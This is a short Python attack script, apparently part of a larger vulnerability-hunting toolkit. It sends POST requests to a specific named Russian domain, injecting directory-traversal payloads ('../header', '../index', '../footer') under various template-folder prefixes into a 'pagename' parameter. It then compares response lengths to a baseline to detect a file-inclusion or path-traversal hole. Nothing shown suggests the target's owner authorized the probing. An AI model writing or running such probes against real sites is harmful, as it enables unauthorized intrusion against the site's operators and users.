from core import vuln

h = "mirk154.ru"
base = "https://" + h
CT = "application/x-www-form-urlencoded"
pid = 4430

def post(pname):
    body = ("page_id=%d&pagename=%s" % (pid, vuln._denc(pname))).encode()
    return vuln._req("POST", base + "/", body=body, ctype=CT)

print("базовая 404:", len((post("pblnope123").text or "")))
for td in ["page-templates", "page-template", "templates", "page", "page-full"]:
    pre = td[5:] if td.startswith("page-") else td
    for tail in ("../header", "../index", "../footer"):
        p = pre + "/" + tail
        try:
            r = post(p)
        except Exception as e:
            print(td, tail, "EXC", type(e).__name__); continue
        t = r.text or ""
        print("%-24s %-10s %s len=%d" % (td, tail, r.status_code, len(t)))